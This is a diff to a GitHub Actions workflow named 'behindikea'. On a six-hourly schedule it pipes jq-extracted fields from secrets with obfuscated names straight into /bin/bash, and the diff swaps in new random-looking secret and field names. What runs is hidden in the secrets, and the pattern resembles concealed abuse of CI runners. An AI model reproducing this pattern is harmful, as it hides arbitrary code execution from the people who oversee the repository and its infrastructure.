@@ -3,21 +3,18 @@ name: behindikea
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
+    - cron: '39 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: behindikea
         env:
-          j15299: ${{ secrets.j15299 }}
+          afi4231: ${{ secrets.afi4231 }}
         run: |
-          echo $j15299 | jq -r .gqv4989 | /bin/bash
-          echo $s9168 | jq -r .q09765 | /bin/bash
-          echo $aaq65188 | jq -r .wy0 | /bin/bash
-          echo $bp36511 | jq -r .d503 | /bin/bash
-          echo $qs12 | jq -r .rmmax9765 | /bin/bash
+          echo $afi4231 | jq -r .y81094 | /bin/bash
+          echo $tzduh65636 | jq -r .m6346 | /bin/bash
+          echo $w68122 | jq -r .lv5418 | /bin/bash
 
